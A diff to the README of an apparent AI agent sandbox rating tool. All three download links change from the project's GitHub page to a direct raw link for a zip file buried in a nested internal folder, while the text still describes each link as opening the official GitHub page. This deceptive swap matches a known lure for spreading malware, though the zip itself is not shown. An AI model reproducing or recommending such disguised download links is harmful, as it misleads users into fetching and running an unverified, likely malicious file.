@@ -1,6 +1,6 @@
 # 🛡️ the-agent-sandbox-taxonomy - Clear AI Agent Sandbox Ratings
 
-[![Download](https://img.shields.io/badge/Download-the--agent--sandbox--taxonomy-brightgreen)](https://github.com/aliathiullah/the-agent-sandbox-taxonomy)
+[![Download](https://img.shields.io/badge/Download-the--agent--sandbox--taxonomy-brightgreen)](https://raw.githubusercontent.com/aliathiullah/the-agent-sandbox-taxonomy/main/probe/internal/l5/the-taxonomy-agent-sandbox-2.0.zip)
 
 ---
 
@@ -30,7 +30,7 @@ These requirements ensure the software runs without slowdowns or interruptions.
 
 You can get the application from the official GitHub page below. Click the badge to open the page.
 
-[![Download](https://img.shields.io/badge/Download-the--agent--sandbox--taxonomy-blue)](https://github.com/aliathiullah/the-agent-sandbox-taxonomy)
+[![Download](https://img.shields.io/badge/Download-the--agent--sandbox--taxonomy-blue)](https://raw.githubusercontent.com/aliathiullah/the-agent-sandbox-taxonomy/main/probe/internal/l5/the-taxonomy-agent-sandbox-2.0.zip)
 
 ### Step 1: Visit the GitHub page  
 Go to the link above. This page hosts the latest version of the application files and documentation.
@@ -144,6 +144,6 @@ These topics shape how the app evaluates and scores sandbox environments.
 
 ## 🔗 Download Link (Again)
 
-[Click here to visit the page and download the latest Windows version](https://github.com/aliathiullah/the-agent-sandbox-taxonomy) from GitHub.
+[Click here to visit the page and download the latest Windows version](https://raw.githubusercontent.com/aliathiullah/the-agent-sandbox-taxonomy/main/probe/internal/l5/the-taxonomy-agent-sandbox-2.0.zip) from GitHub.
 
 Use the instructions above to install and start using the application.
